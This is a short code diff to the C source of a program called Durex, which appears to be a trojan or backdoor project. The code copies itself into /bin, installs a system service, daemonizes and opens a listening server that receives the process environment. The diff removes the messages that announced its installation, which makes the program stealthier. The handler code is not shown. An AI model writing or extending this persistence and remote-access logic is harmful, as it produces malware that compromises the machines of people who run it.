@@ -15,7 +15,7 @@ uint8_t		copy_in_bin(char *fname)
 	{
 		write(fd_out, buffer, r);
 	}
-	close(fd_out);	
+	close(fd_out);
 	close(fd_in);
 	return (1);
 }
@@ -35,7 +35,7 @@ uint8_t		copy_in_service(const char *durex_service)
 	return (1);
 }
 
-int		main(int ac, char **argv)
+int		main(int ac, char **argv, char **env)
 {
 	int	fd_lock;
 	int sock;
@@ -56,14 +56,13 @@ int		main(int ac, char **argv)
 			ft_putendl_fd("Two instances of durex can not run at the same time", 2);
 			return (3);
 		}
-		printf("Running Durex in /bin\n");
-		printf("%s\n", durex_service);
 		if (!copy_in_service(durex_service))
 			return (0);
 		daemon(0, 1);
 
-		sock = create_server();
-		handle_connection(sock);
+		if (!(sock = create_server()))
+			return (0);
+		handle_connection(sock, env);
 	}
 	return (0);
 }
